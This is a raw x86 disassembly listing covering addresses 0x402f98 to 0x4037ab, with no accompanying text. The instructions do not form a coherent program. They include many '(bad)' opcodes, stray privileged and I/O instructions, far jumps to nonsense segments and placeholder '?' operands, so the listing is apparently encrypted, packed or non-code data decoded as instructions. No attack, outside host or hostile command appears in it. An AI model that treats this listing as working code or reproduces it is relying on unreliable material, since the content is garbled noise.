  402f98:	sbb    cl,bh
  402f9a:	pop    esp
  402f9b:	(bad)  
  402f9c:	pop    ds
  402f9d:	repnz add bl,dl
  402fa0:	std    
  402fa1:	lds    ecx,FWORD PTR [ecx+0x16]
  402fa4:	jmp    0x52e4:0xb55272f2
  402fab:	adc    dl,BYTE PTR [ebp-0x2a296cd2]
  402fb1:	shl    DWORD PTR [ebp-0x1c],cl
  402fb4:	scas   al,BYTE PTR es:[edi]
  402fb5:	std    
  402fb6:	inc    ebp
  402fb7:	out    dx,eax
  402fb8:	sbb    al,0xe1
  402fba:	(bad)  
  402fbc:	cmp    BYTE PTR [ebx],0x1f
  402fbf:	push   ebx
  402fc0:	push   cs
  402fc1:	or     bl,BYTE PTR [ebp-0x6dd9cfa2]
  402fc7:	push   eax
  402fc8:	jp     0x403017
  402fca:	leave  
  402fcb:	dec    ecx
  402fcc:	sbb    al,0xe0
  402fce:	scas   eax,DWORD PTR es:[edi]
  402fcf:	lods   al,BYTE PTR ds:[esi]
  402fd0:	sub    eax,0x6f07c25b
  402fd5:	inc    edi
  402fd6:	push   cs
  402fd7:	mov    edx,0xba3709ee
  402fdc:	imul   ecx,edx,0xffffffa5
  402fdf:	stos   BYTE PTR es:[edi],al
  402fe0:	(bad)  
  402fe2:	add    eax,0xc7b15eaa
  402fe7:	mov    ?,edx
  402fe9:	inc    ebx
  402fea:	icebp  
  402feb:	dec    eax
  402fec:	inc    esp
  402fed:	dec    eax
  402fee:	rcl    DWORD PTR [ebp+0xb],1
  402ff1:	cmp    dh,BYTE PTR [ecx]
  402ff3:	jo     0x402fe1
  402ff5:	fild   WORD PTR [edx+eiz*4-0x264cbabb]
  402ffc:	daa    
  402ffd:	jae    0x403052
  402fff:	(bad)
  403002:	pop    ebx
  403003:	jbe    0x402f8f
  403005:	inc    esi
  403006:	bound  esp,QWORD PTR [esi+0x4cb30adf]
  40300c:	xchg   DWORD PTR [ecx+0x32441918],ecx
  403012:	pop    edx
  403013:	retf   
  403014:	cmp    dl,bl
  403016:	jecxz  0x402faa
  403018:	add    DWORD PTR [ebp-0x4b9bf549],0x63735c93
  403022:	sub    ecx,DWORD PTR [esi-0x457a9378]
  403028:	add    BYTE PTR [ebp-0x602fe989],al
  40302e:	xor    eax,0x1c0ec644
  403033:	arpl   ax,si
  403035:	inc    ebx
  403036:	add    dh,ch
  403038:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403039:	jle    0x402fbc
  40303b:	and    esi,esp
  40303d:	iret   
  40303e:	fcomip st,st(0)
  403040:	mov    ebp,0x1842e3d
  403045:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403046:	data16 jg 0x40306f
  403049:	inc    ebx
  40304a:	(bad)  
  40304b:	in     al,0x76
  40304d:	pusha  
  40304e:	and    eax,DWORD PTR ds:0xea376fcd
  403054:	mov    dh,0xea
  403056:	imul   edi,DWORD PTR [edx+0x655577e5],0xffffff84
  40305d:	dec    eax
  40305e:	mov    bh,0x6d
  403060:	repnz xor DWORD PTR [eax],edx
  403063:	pop    esi
  403064:	int3   
  403065:	mov    ebx,0x706b9aed
  40306a:	and    BYTE PTR [ecx],ah
  40306c:	xchg   ecx,eax
  40306d:	jmp    0x403049
  40306f:	xor    eax,0x70f16198
  403074:	dec    eax
  403075:	into   
  403076:	in     al,0xb9
  403078:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403079:	(bad)  
  40307a:	lods   al,BYTE PTR ds:[esi]
  40307b:	rcl    DWORD PTR [ecx+0x111e3e98],cl
  403081:	mov    ebx,0x5f8da43f
  403086:	fs pop ss
  403088:	out    dx,eax
  403089:	inc    edx
  40308a:	or     ah,BYTE PTR [ecx-0x13ef1db3]
  403090:	call   0x1b30:0xe5f00875
  403097:	xor    DWORD PTR [eax-0x4a],ebx
  40309a:	sbb    al,0xd7
  40309c:	xchg   DWORD PTR [ebp-0x7f986ed4],edi
  4030a2:	jnp    0x4030a1
  4030a4:	push   ebx
  4030a5:	xlat   BYTE PTR ds:[ebx]
  4030a6:	mov    cl,0x64
  4030a8:	ds mov ebp,0x1520f6cf
  4030ae:	cdq    
  4030af:	push   es
  4030b0:	(bad)  
  4030b1:	xor    al,0xdf
  4030b3:	dec    ebx
  4030b4:	(bad)  
  4030b5:	add    al,0xf9
  4030b7:	popf   
  4030b8:	dec    edi
  4030b9:	adc    eax,0xb3a16ca0
  4030be:	cmp    DWORD PTR [ebp-0x61],edi
  4030c1:	sbb    BYTE PTR [ecx+eax*1],0xa9
  4030c5:	cmc    
  4030c6:	fld    TBYTE PTR ds:0x8e9a917a
  4030cc:	mov    eax,0x2b8a51cb
  4030d1:	or     DWORD PTR [ebx],eax
  4030d3:	push   es
  4030d4:	mov    edx,0x8b615a5e
  4030d9:	sub    eax,0x38beeb2c
  4030de:	hlt    
  4030df:	cmp    eax,0xec0a24b3
  4030e4:	jl     0x403094
  4030e6:	data16 cli 
  4030e8:	inc    ebx
  4030e9:	fisub  DWORD PTR [edx]
  4030eb:	loope  0x4030b9
  4030ed:	sbb    BYTE PTR [ebp+eax*8+0x637bb32b],ah
  4030f4:	popa   
  4030f5:	mov    eax,0x9f2c4797
  4030fa:	dec    esp
  4030fb:	jle    0x403139
  4030fd:	inc    ebx
  4030fe:	pusha  
  4030ff:	fdivr  st(7),st
  403101:	pop    ds
  403102:	fnsave [edi-0x4c9bddfa]
  403108:	xacquire lock and DWORD PTR [edi+0x14096386],edi
  403110:	mov    ebx,0xd1af02bd
  403115:	imul   ebx,esp,0x6
  403118:	and    cl,dl
  40311a:	shl    cl,1
  40311c:	adc    DWORD PTR [edx],esi
  40311e:	inc    esi
  40311f:	sbb    cl,bl
  403121:	xor    al,0x96
  403123:	sub    DWORD PTR ds:0xcef9fa93,esi
  403129:	xor    esi,eax
  40312b:	pop    ss
  40312c:	lock cld 
  40312e:	add    BYTE PTR [ebp*8+0x26cea6f3],ch
  403135:	ror    BYTE PTR [esi-0x45],cl
  403138:	stc    
  403139:	jo     0x4031af
  40313b:	lods   al,BYTE PTR ds:[esi]
  40313c:	dec    edi
  40313d:	adc    BYTE PTR [ebp+0x16],dl
  403140:	pop    edi
  403141:	mov    bl,0xed
  403143:	jns    0x4030cf
  403145:	(bad)  
  403146:	test   BYTE PTR [ebp-0x43],0x5f
  40314a:	dec    esp
  40314b:	mov    ds:0x87662896,eax
  403150:	js     0x403161
  403152:	imul   esp,DWORD PTR [edi-0x16463ea2],0xffffff8d
  403159:	fimul  DWORD PTR [esi-0x40f1adc1]
  40315f:	push   ds
  403160:	inc    esp
  403161:	fistp  QWORD PTR [edx+0x74]
  403164:	jecxz  0x403190
  403166:	scas   eax,DWORD PTR es:[edi]
  403167:	push   0xf091221d
  40316c:	retf   0x2b3b
  40316f:	or     BYTE PTR [eax+esi*1+0x5b],0xac
  403174:	pop    ebx
  403175:	add    al,0x40
  403177:	xchg   ebp,esi
  403179:	xchg   ebx,eax
  40317a:	mov    eax,0xe8e19191
  40317f:	call   0xbd67:0x8bc5ac0a
  403186:	cmp    BYTE PTR [edx+0x6d],bh
  403189:	shr    BYTE PTR [esi-0x6b],cl
  40318c:	mov    dh,0x99
  40318e:	jnp    0x403128
  403190:	jb     0x403132
  403192:	mov    eax,0x4c7e221
  403197:	push   ds
  403198:	outs   dx,BYTE PTR ds:[esi]
  403199:	lds    eax,FWORD PTR [eax+0x22bbac01]
  40319f:	dec    eax
  4031a0:	ret    
  4031a1:	cmp    DWORD PTR [ebx+eiz*1-0x3f176501],edi
  4031a8:	lahf   
  4031a9:	sbb    DWORD PTR [edx+0x58bf4fcb],0x52201b01
  4031b3:	sbb    eax,0xafc600f
  4031b8:	push   eax
  4031b9:	dec    esp
  4031ba:	inc    ebp
  4031bb:	and    ch,BYTE PTR cs:[ebx-0x48b2a86e]
  4031c2:	mov    ch,BYTE PTR [ebx-0x4861ec0c]
  4031c8:	add    BYTE PTR [edx-0x64],cl
  4031cb:	aam    0x66
  4031cd:	arpl   WORD PTR [esi-0x38fc69d9],bp
  4031d3:	imul   esp,DWORD PTR [edx-0x49],0x52d0192e
  4031da:	or     ebx,0xffffffe0
  4031dd:	sbb    ebx,DWORD PTR [edi+0x1c3b970]
  4031e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4031e4:	test   al,0xa4
  4031e6:	aas    
  4031e7:	aad    0xbf
  4031e9:	mov    al,ds:0x3737f7c2
  4031ee:	add    ebx,DWORD PTR [ecx]
  4031f0:	fs inc ebp
  4031f2:	loope  0x4031ee
  4031f4:	(bad)  
  4031f5:	mov    dh,bh
  4031f7:	popf   
  4031f8:	or     DWORD PTR [eax-0x31],0xffffffce
  4031fc:	ret    0x91a8
  4031ff:	lds    esp,FWORD PTR [esi-0x7d]
  403202:	out    0x78,eax
  403204:	clc    
  403205:	mov    ebx,esi
  403207:	lea    edx,[esi+0x6323214f]
  40320d:	cmc    
  40320e:	or     eax,0x6d3ee700
  403213:	mov    WORD PTR [edi],?
  403215:	pop    ds
  403216:	(bad)  
  403217:	mov    eax,0xab1cc548
  40321c:	jmp    DWORD PTR cs:[edi-0x6e5a7e54]
  403223:	xor    al,0x56
  403225:	inc    ebx
  403226:	into   
  403227:	test   DWORD PTR [eax-0x122619bd],ecx
  40322d:	mov    DWORD PTR [esi],esp
  40322f:	(bad)  
  403231:	cmp    eax,DWORD PTR [ecx-0x434be9ab]
  403237:	push   ecx
  403238:	dec    esp
  403239:	loop   0x403231
  40323b:	adc    eax,0x536b903d
  403240:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403241:	push   0xffffff8c
  403243:	add    DWORD PTR [edi-0x67],edi
  403246:	push   ecx
  403247:	es daa 
  403249:	mov    ebx,0xe10344b9
  40324e:	adc    eax,eax
  403250:	jp     0x4031d2
  403252:	test   eax,0x353349a4
  403257:	xor    esi,ebp
  403259:	js     0x403213
  40325b:	aaa    
  40325c:	cs (bad) 
  40325f:	out    0x96,eax
  403261:	pop    ebx
  403262:	push   ecx
  403263:	adc    al,0xe
  403265:	add    eax,0xf242edf5
  40326a:	adc    al,0x38
  40326c:	(bad)  
  40326e:	xchg   esp,eax
  40326f:	and    eax,0xd8cde692
  403274:	repnz ins BYTE PTR es:[edi],dx
  403276:	inc    esi
  403277:	mov    dh,0x41
  403279:	out    0xa2,eax
  40327b:	jmp    0xfd75:0xf7241dd3
  403282:	addr16 aam 0x3d
  403285:	leave  
  403286:	mov    ebp,0x182bab3c
  40328b:	jb     0x4032e0
  40328d:	inc    esp
  40328e:	nop
  40328f:	mov    bl,0x6b
  403291:	mov    ds:0x9e05f6c5,al
  403296:	pusha  
  403297:	les    esi,FWORD PTR [ecx+0x2bcf9e55]
  40329d:	retf   
  40329e:	cmp    BYTE PTR [edx-0x480c76a1],cl
  4032a4:	lds    ebx,FWORD PTR [ecx+0x3]
  4032a7:	sbb    al,0x5b
  4032a9:	fadd   DWORD PTR [edi+0x5b]
  4032ac:	jg     0x403235
  4032ae:	out    0x6f,al
  4032b0:	sub    esi,DWORD PTR [edi-0xc2c56f2]
  4032b6:	jo     0x40325b
  4032b8:	jnp    0x4032a4
  4032ba:	mov    esi,0xe603cc9d
  4032bf:	xor    eax,0x4579b622
  4032c4:	icebp  
  4032c5:	push   ecx
  4032c6:	or     DWORD PTR [ebx],edi
  4032c8:	aam    0xd8
  4032ca:	mov    ebp,0x46fa4bc6
  4032cf:	pop    ss
  4032d0:	adc    BYTE PTR [ebx],0x56
  4032d3:	xchg   ecx,eax
  4032d4:	pop    ebp
  4032d5:	sar    DWORD PTR [ebx-0x418dc967],1
  4032db:	or     BYTE PTR [edi+0x48],dh
  4032de:	xor    DWORD PTR [ebp-0x6dac03cd],0xffffff9e
  4032e5:	scas   al,BYTE PTR es:[edi]
  4032e6:	adc    al,0x4
  4032e8:	mov    bl,0x7b
  4032ea:	in     eax,dx
  4032eb:	lea    esp,[ebx-0x3255f07c]
  4032f1:	mov    cl,0x3d
  4032f3:	outs   dx,BYTE PTR ds:[esi]
  4032f4:	and    esi,DWORD PTR [eax+0x6753a653]
  4032fa:	aaa    
  4032fb:	mov    ah,0x29
  4032fd:	xchg   esi,eax
  4032fe:	and    ah,BYTE PTR ds:0x154e892b
  403304:	(bad)  [ecx]
  403306:	xor    edi,0x65e5d30
  40330c:	lods   al,BYTE PTR ds:[esi]
  40330d:	sub    bh,al
  40330f:	mov    ecx,0xfeb63174
  403314:	test   DWORD PTR [eax],edx
  403316:	push   ds
  403317:	pop    eax
  403318:	test   DWORD PTR [edx],ebx
  40331a:	push   eax
  40331b:	bound  edi,QWORD PTR [eax+0x39681aaf]
  403321:	add    esp,DWORD PTR [ecx+0x50b2ec41]
  403327:	mov    ah,0x61
  403329:	jecxz  0x403369
  40332b:	fmul   st(7),st
  40332d:	mov    esp,0xacb49307
  403332:	loopne 0x40339c
  403334:	leave  
  403335:	mov    esi,0x2ecedc78
  40333a:	lahf   
  40333b:	fyl2x  
  40333d:	sub    ebp,DWORD PTR [ebx-0x69]
  403340:	sbb    eax,DWORD PTR [eax+eax*4+0x1e5d4f6d]
  403347:	jecxz  0x4033c8
  403349:	inc    esp
  40334a:	sti    
  40334b:	je     0x403306
  40334d:	push   edx
  40334e:	jno    0x403301
  403350:	imul   DWORD PTR [ebx-0x556f4114]
  403356:	or     ebp,esp
  403358:	pop    ebx
  403359:	mov    eax,0x12793a70
  40335e:	je     0x403330
  403360:	jns    0x4033a4
  403362:	enter  0x242c,0xed
  403366:	aam    0xc0
  403368:	adc    cl,BYTE PTR [ecx+0x5b5fe05]
  40336e:	inc    esi
  40336f:	adc    dl,bl
  403371:	jns    0x4033a2
  403373:	adc    DWORD PTR [esi],ecx
  403375:	retf   0xd181
  403378:	aam    0xf4
  40337a:	pop    esi
  40337b:	leave  
  40337c:	imul   ebp,DWORD PTR [ebx],0x40599c6c
  403382:	add    BYTE PTR [esi+0x5],ah
  403385:	sub    eax,0x6e048eb5
  40338a:	sbb    al,0x5e
  40338c:	adc    ah,0x33
  40338f:	les    esp,FWORD PTR [edi]
  403391:	outs   dx,BYTE PTR ds:[esi]
  403392:	push   ebx
  403393:	xor    DWORD PTR [ebp-0x2626bec],0x6a
  40339a:	adc    esp,ebx
  40339c:	jecxz  0x403354
  40339e:	enter  0x602b,0x8e
  4033a2:	jg     0x4033a6
  4033a4:	push   edi
  4033a5:	daa    
  4033a6:	lods   al,BYTE PTR ds:[esi]
  4033a7:	cld    
  4033a8:	(bad)  
  4033a9:	clc    
  4033aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4033ab:	clc    
  4033ac:	cld    
  4033ad:	cmp    esi,DWORD PTR [ecx-0x538e98fe]
  4033b3:	xchg   edx,eax
  4033b4:	sub    edx,DWORD PTR [ecx+0x6d3a17d9]
  4033ba:	adc    DWORD PTR [eax-0x1a],esp
  4033bd:	xchg   ecx,eax
  4033be:	push   esp
  4033bf:	js     0x403419
  4033c1:	cld    
  4033c2:	test   DWORD PTR [edx-0x22268b6b],esp
  4033c8:	stc    
  4033c9:	mov    DWORD PTR [eax],esp
  4033cb:	cs adc al,0xc2
  4033ce:	in     eax,dx
  4033cf:	(bad)  
  4033d0:	int3   
  4033d1:	aaa    
  4033d2:	fs inc edi
  4033d4:	mov    ah,0xb4
  4033d6:	pop    edi
  4033d7:	dec    ecx
  4033d8:	inc    esp
  4033d9:	inc    ebp
  4033da:	jns    0x4033a1
  4033dc:	hlt    
  4033dd:	mov    esi,DWORD PTR [ecx+esi*2]
  4033e0:	or     al,0xb9
  4033e2:	out    dx,al
  4033e3:	sub    al,0xfc
  4033e5:	ja     0x40345e
  4033e7:	sub    esi,DWORD PTR [ebp+0x6c]
  4033ea:	pop    ecx
  4033eb:	stc    
  4033ec:	je     0x40338e
  4033ee:	push   es
  4033ef:	mov    bl,0x17
  4033f1:	ss xchg esi,eax
  4033f3:	scas   al,BYTE PTR es:[edi]
  4033f4:	mov    ebx,0xf493e7ee
  4033f9:	ds test eax,0xfdf8ed60
  4033ff:	imul   eax,ebx,0x3868ffc7
  403405:	pop    edx
  403406:	pop    edi
  403407:	or     edi,DWORD PTR [esi+0x37]
  40340a:	jns    0x4033df
  40340c:	inc    ebx
  40340d:	mov    esp,DWORD PTR ds:0x58875724
  403413:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403414:	popf   
  403415:	fsubr  st(5),st
  403417:	or     dh,BYTE PTR [ecx]
  403419:	cmp    ch,BYTE PTR [ebp-0x5887595f]
  40341f:	cmp    BYTE PTR [edx+0x3d],0xca
  403423:	pop    esp
  403424:	inc    esi
  403425:	dec    esi
  403426:	jne    0x403443
  403428:	mov    bh,0xb1
  40342a:	fistp  DWORD PTR [edi-0x3be4fdde]
  403430:	loop   0x403432
  403432:	sub    DWORD PTR [di-0x32b2],0x5f
  403438:	mov    ecx,0x140a391f
  40343d:	imul   esi,DWORD PTR es:[esi+0x62],0x740c89ed
  403445:	push   0x12eb2366
  40344a:	jnp    0x40342a
  40344c:	add    eax,0x72417fd7
  403451:	inc    ebx
  403452:	sbb    cl,BYTE PTR [ebx+0x7c]
  403455:	jnp    0x40349d
  403457:	sbb    BYTE PTR [edi],ch
  403459:	(bad)  
  40345b:	imul   eax,DWORD PTR [eax+0x33d423ae],0x2b37b106
  403465:	jno    0x4034c9
  403467:	pop    eax
  403468:	push   es
  403469:	addr16 leave 
  40346b:	adc    DWORD PTR [eax-0x38],ebp
  40346e:	fs mov ebx,0x1435a775
  403474:	into   
  403475:	into   
  403476:	push   ss
  403477:	push   0x36
  403479:	imul   esp,DWORD PTR [ebp-0x97f50f6],0xffffff8c
  403480:	(bad)
  403483:	push   ss
  403484:	stos   BYTE PTR es:[edi],al
  403485:	std    
  403486:	add    edi,esp
  403488:	andnps xmm6,XMMWORD PTR [ebx-0x47]
  40348c:	repnz (bad) [edi]
  40348f:	jae    0x40341c
  403491:	mov    edx,0xb90a9f72
  403496:	jl     0x40347f
  403498:	cld    
  403499:	and    eax,0x63833055
  40349e:	xor    eax,0x6bf7d78a
  4034a3:	lods   eax,DWORD PTR ds:[esi]
  4034a4:	mov    ds:0xcf7abfcd,al
  4034a9:	cmp    ch,ah
  4034ab:	fincstp 
  4034ad:	mov    bh,0x52
  4034af:	adc    DWORD PTR [ecx+0x7aa8888e],ecx
  4034b5:	xchg   edi,eax
  4034b6:	sub    ecx,eax
  4034b8:	and    ah,cl
  4034ba:	adc    dh,dh
  4034bc:	fwait
  4034bd:	sub    esp,edx
  4034bf:	out    dx,al
  4034c0:	and    bl,BYTE PTR [edi+0x17]
  4034c3:	fiadd  DWORD PTR [edi+0x7cd6fc9f]
  4034c9:	sub    ebx,DWORD PTR [edx+0x14]
  4034cc:	data16 icebp 
  4034ce:	jmp    0x193960a5
  4034d3:	mov    edx,gs
  4034d5:	and    DWORD PTR [edi-0x326662f5],eax
  4034db:	cmp    BYTE PTR [ebx+0x54],bl
  4034de:	out    dx,al
  4034df:	push   ebp
  4034e0:	xchg   ecx,eax
  4034e1:	mov    ds,WORD PTR [eax]
  4034e3:	cli    
  4034e4:	inc    esi
  4034e5:	scas   eax,DWORD PTR es:[edi]
  4034e6:	push   esi
  4034e7:	sub    eax,0x707f53bc
  4034ec:	retf   0x7a7f
  4034ef:	dec    edi
  4034f0:	add    DWORD PTR [eiz*8-0x3d0f7b3d],edx
  4034f7:	inc    eax
  4034f8:	data16 jge 0x4034a5
  4034fb:	push   cs
  4034fc:	jp     0x4034aa
  4034fe:	cld    
  4034ff:	fiadd  DWORD PTR [eax-0x5]
  403502:	int    0xf4
  403504:	and    edi,DWORD PTR [ebx-0x6d846a6b]
  40350a:	ins    BYTE PTR es:[edi],dx
  40350b:	lock jmp 0x7df0d22a
  403511:	adc    dl,BYTE PTR [ecx+edi*1+0x12a3ef9]
  403518:	shr    DWORD PTR [ebx-0x3f],1
  40351b:	fimul  DWORD PTR [ebx-0x32f7ab2c]
  403521:	es retf 
  403523:	push   cs
  403524:	idiv   edi
  403526:	pop    esp
  403527:	scas   al,BYTE PTR es:[edi]
  403528:	sbb    DWORD PTR [eax],0xe15ae5e9
  40352e:	pop    es
  40352f:	xchg   edi,edx
  403531:	aas    
  403532:	jg     0x403500
  403534:	jae    0x4034ed
  403536:	lds    esi,FWORD PTR [esp+ebx*4]
  403539:	dec    eax
  40353a:	adc    eax,0x4a20de72
  40353f:	adc    al,0x7f
  403541:	sbb    DWORD PTR [edx],0xfffffff1
  403544:	and    DWORD PTR [ebp+0x1e],ebx
  403547:	int3   
  403548:	inc    esi
  403549:	jecxz  0x40350b
  40354b:	test   DWORD PTR [ecx],ecx
  40354d:	cld    
  40354e:	xchg   ebx,eax
  40354f:	hlt    
  403550:	fwait
  403551:	loop   0x403520
  403553:	mov    ecx,0xafd51563
  403558:	or     esp,DWORD PTR [edx-0x64]
  40355b:	arpl   dx,ax
  40355d:	nop
  40355e:	sbb    ebx,DWORD PTR [edx+0x3e]
  403561:	cmp    ebp,edx
  403563:	dec    edi
  403564:	dec    ebp
  403565:	test   DWORD PTR [edi-0x40e14301],0x991de87
  40356f:	aas    
  403570:	xor    eax,0xa5969528
  403575:	xor    BYTE PTR [edx],dl
  403577:	xlat   BYTE PTR ds:[ebx]
  403578:	xchg   esp,eax
  403579:	imul   ecx,DWORD PTR [esi-0x193acea1],0xffffff9b
  403580:	enter  0xbed,0x2b
  403584:	mov    dl,0x30
  403586:	xchg   esi,eax
  403587:	lods   eax,DWORD PTR ds:[esi]
  403588:	xchg   ebp,eax
  403589:	jo     0x403553
  40358b:	push   edx
  40358c:	jo     0x4035f4
  40358e:	(bad)
  403591:	test   BYTE PTR [edx+0x5cf24711],ah
  403597:	dec    edx
  403598:	je     0x4035a8
  40359a:	imul   edx,DWORD PTR [edi+0x7f],0xb17d7912
  4035a1:	sub    DWORD PTR [esi],0x3c
  4035a4:	imul   ebx,DWORD PTR ds:0xc529647d,0x8
  4035ab:	mov    edx,0x8987c0d9
  4035b0:	out    dx,eax
  4035b1:	mov    ds:0x17335b3a,eax
  4035b6:	sbb    al,0x71
  4035b8:	mov    ecx,0x55850b7b
  4035bd:	mov    cl,bl
  4035bf:	arpl   cx,sp
  4035c1:	fcom   DWORD PTR [edx+0x2]
  4035c4:	cld    
  4035c5:	fwait
  4035c6:	cmp    al,0x66
  4035c8:	pop    edi
  4035c9:	xchg   ebx,eax
  4035ca:	xchg   ebx,eax
  4035cb:	(bad)  
  4035cc:	pop    esp
  4035cd:	and    eax,DWORD PTR [ebx]
  4035cf:	(bad)  
  4035d0:	cmp    esp,DWORD PTR [ecx]
  4035d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4035d3:	out    dx,eax
  4035d4:	inc    ebp
  4035d5:	repz jno 0x4035fd
  4035d8:	jbe    0x403586
  4035da:	add    DWORD PTR [edx-0x1b3d896],ecx
  4035e0:	(bad)  
  4035e1:	fnstsw WORD PTR [edx+0x1d68da9f]
  4035e7:	cmc    
  4035e8:	iret   
  4035e9:	stc    
  4035ea:	fisubr DWORD PTR [eax]
  4035ec:	test   al,0xfa
  4035ee:	ficom  DWORD PTR [edx+0x40]
  4035f1:	sub    BYTE PTR [edi],cl
  4035f3:	std    
  4035f4:	and    ch,ch
  4035f6:	jmp    0xbfa5fa1
  4035fb:	call   0xa16:0x5a4bbef5
  403602:	fstp   TBYTE PTR [edx+edx*4]
  403605:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403606:	adc    al,0xe2
  403608:	out    dx,eax
  403609:	jno    0x403598
  40360b:	pop    ss
  40360c:	inc    esi
  40360d:	jb     0x403615
  40360f:	mul    DWORD PTR [esi]
  403611:	jge    0x40368c
  403613:	mov    cs,WORD PTR [ebp+0x7d]
  403616:	and    eax,0xc52bae21
  40361b:	xor    BYTE PTR [edi],cl
  40361d:	or     al,0xaf
  40361f:	dec    ebp
  403620:	cdq    
  403621:	jno    0x40368a
  403623:	or     eax,0xcd784aa9
  403628:	(bad)  
  403629:	(bad)  
  40362a:	mov    ebx,0xb07e0958
  40362f:	enter  0x2d2a,0x76
  403633:	jne    0x403637
  403635:	sbb    eax,edx
  403637:	mov    ebx,0x2bac1eeb
  40363c:	sbb    eax,DWORD PTR [ebx]
  40363e:	aaa    
  40363f:	add    al,0xad
  403641:	push   es
  403642:	mov    eax,0xbc0f3899
  403647:	cmp    eax,0xea52a595
  40364c:	or     ch,BYTE PTR [ebp-0xddf11e9]
  403652:	and    eax,ebp
  403654:	cmp    DWORD PTR [ebx],esp
  403656:	adc    BYTE PTR [eax],bl
  403658:	push   ds
  403659:	inc    ecx
  40365a:	add    eax,0xf6188ee1
  40365f:	xchg   ecx,eax
  403660:	push   0xac406cc
  403665:	mov    esi,0x6b4fd0dc
  40366a:	dec    eax
  40366b:	div    BYTE PTR [edi+0x5c]
  40366e:	and    al,0x62
  403670:	js     0x40362a
  403672:	cld    
  403673:	and    al,0x38
  403675:	daa    
  403676:	jle    0x40369b
  403678:	push   ss
  403679:	mov    eax,0xe5fada9c
  40367e:	mov    bl,0xff
  403680:	cmp    bh,0x1a
  403683:	out    dx,al
  403684:	push   esi
  403685:	xchg   esi,eax
  403686:	bound  ebp,QWORD PTR [edx*2+0x36cd9650]
  40368d:	xchg   ebp,eax
  40368e:	cmp    ebp,edi
  403690:	jbe    0x4036f9
  403692:	repz xchg esp,eax
  403694:	outs   dx,DWORD PTR ds:[esi]
  403695:	sub    edi,DWORD PTR [edi+0x35]
  403698:	jmp    0x4036e5
  40369a:	pop    esp
  40369b:	shl    DWORD PTR [esi],1
  40369d:	mov    edx,0x9400d455
  4036a2:	lea    ebp,[ebp-0x23]
  4036a5:	jno    0x4036e7
  4036a7:	add    al,0x82
  4036a9:	jo     0x403652
  4036ab:	lods   eax,DWORD PTR ds:[esi]
  4036ac:	jmp    0x6775fff0
  4036b1:	xor    al,cl
  4036b3:	add    dh,BYTE PTR [edi]
  4036b5:	or     eax,0x630f9478
  4036ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4036bb:	cmp    eax,esp
  4036bd:	xor    DWORD PTR [ebx-0x6e],eax
  4036c0:	scas   eax,DWORD PTR es:[edi]
  4036c1:	jb     0x4036f5
  4036c3:	jg     0x40369b
  4036c5:	mov    bh,0x97
  4036c7:	repz pop ss
  4036c9:	mov    bh,0x8f
  4036cb:	lock daa 
  4036cd:	shr    DWORD PTR [ecx],1
  4036cf:	stos   DWORD PTR es:[edi],eax
  4036d0:	xor    eax,0xdd602a5f
  4036d5:	mov    edi,0xd8e9aa46
  4036da:	int3   
  4036db:	pop    ds
  4036dc:	adc    BYTE PTR [eax-0x6c169d06],bh
  4036e2:	sub    DWORD PTR [esi-0x26],ebp
  4036e5:	pop    ebp
  4036e6:	mov    ecx,0x34e446d1
  4036eb:	hlt    
  4036ec:	mov    ebp,0x11cf9027
  4036f1:	ret    
  4036f2:	jmp    0xbdc4:0xca48c16d
  4036f9:	mov    ebp,0x167a7ee4
  4036fe:	dec    esp
  4036ff:	pop    ecx
  403700:	push   edx
  403701:	dec    ebp
  403702:	jp     0x403739
  403704:	mul    DWORD PTR [edx]
  403706:	jbe    0x4036cc
  403708:	pushf  
  403709:	stos   DWORD PTR es:[edi],eax
  40370a:	dec    ebp
  40370b:	into   
  40370c:	xchg   esi,eax
  40370d:	addr16 cwde 
  40370f:	iret   
  403710:	and    BYTE PTR [edx+0x52ac9866],bl
  403716:	rol    BYTE PTR [esi-0x28fc31b6],0x26
  40371d:	cwde   
  40371e:	and    ecx,eax
  403720:	sahf   
  403721:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403722:	jbe    0x403725
  403724:	xchg   esi,eax
  403725:	add    DWORD PTR [edi+ebp*1-0x28],ebx
  403729:	jg     0x4036f6
  40372b:	inc    ebx
  40372c:	xchg   eax,ecx
  40372e:	punpcklwd mm0,DWORD PTR [eax-0x17]
  403732:	push   ebx
  403733:	loope  0x403714
  403735:	mov    dl,0xf9
  403737:	xchg   esi,eax
  403738:	es icebp 
  40373a:	jnp    0x40373b
  40373c:	add    al,0x7b
  40373e:	sbb    esp,DWORD PTR [ebp+0x5b953849]
  403744:	jns    0x4037ac
  403746:	xchg   DWORD PTR [edx-0x16],eax
  403749:	push   cs
  40374a:	loope  0x40375d
  40374c:	iret   
  40374d:	retf   
  40374e:	and    ah,BYTE PTR [edi-0x769cfb6a]
  403754:	add    al,0xd4
  403756:	stos   BYTE PTR es:[edi],al
  403757:	packuswb mm3,QWORD PTR [edi]
  40375a:	arpl   WORD PTR [edi],cx
  40375c:	inc    eax
  40375d:	sbb    BYTE PTR [ecx],0xd5
  403760:	bound  edi,QWORD PTR [edi-0x79]
  403763:	out    0x2f,eax
  403765:	mov    dl,0x8d
  403767:	sub    cl,BYTE PTR [ecx-0x47]
  40376a:	adc    esi,DWORD PTR [edi+0x4bb02be0]
  403770:	lahf   
  403771:	jle    0x4037e3
  403773:	loope  0x40370b
  403775:	mov    dl,0x3f
  403777:	imul   edi,DWORD PTR [edi+0x33],0x3a
  40377b:	aaa    
  40377c:	aam    0x3b
  40377e:	sub    DWORD PTR [eax+ecx*2+0x7faba917],0x78b4a4c2
  403789:	mov    dl,0x18
  40378b:	in     eax,0xe4
  40378d:	mov    al,0x9a
  40378f:	dec    edx
  403790:	mov    edx,DWORD PTR [esi]
  403792:	inc    ecx
  403793:	xor    eax,0xb58f908f
  403798:	mov    eax,ds:0xc6c865cc
  40379d:	dec    esp
  40379e:	inc    esi
  40379f:	popa   
  4037a0:	test   BYTE PTR [edx],0x3b
  4037a3:	push   0xae426c1
  4037a8:	outs   dx,DWORD PTR ds:[esi]
  4037a9:	xor    ebx,eax
  4037ab:	iret   
